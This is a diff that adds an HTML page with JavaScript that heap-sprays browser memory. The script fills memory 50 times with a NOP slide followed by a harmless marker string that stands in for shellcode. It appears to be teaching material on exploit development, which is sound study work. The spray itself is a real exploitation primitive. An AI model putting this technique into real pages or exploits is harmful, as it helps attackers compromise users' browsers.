@@ -1,0 +1,28 @@
+<html>
+<body>
+<script language='javascript'>
+  
+    size = 0x3E8;  // 1000-bytes
+    NopSlide = ''; // Initially set to be empty
+  
+    var Shellcode = unescape(
+    '%u7546%u7a7a%u5379'+   // ASCII
+    '%u6365%u7275%u7469'+   // FuzzySecurity
+    '%u9079');              //
+     
+    // Keep filling with nops till we reach 1000-bytes
+    for (c = 0; c < size; c++){ 
+    NopSlide += unescape('%u9090%u9090');}
+    // Subtract size of shelccode
+    NopSlide = NopSlide.substring(0,size - Shellcode.length);
+     
+    // Spray our payload 50 times
+    var memory = new Array();
+    for (i = 0; i < 50; i++){
+    memory[i] = NopSlide + Shellcode;}
+  
+    alert("allocation done");
+  
+</script>
+</body>
+</html>
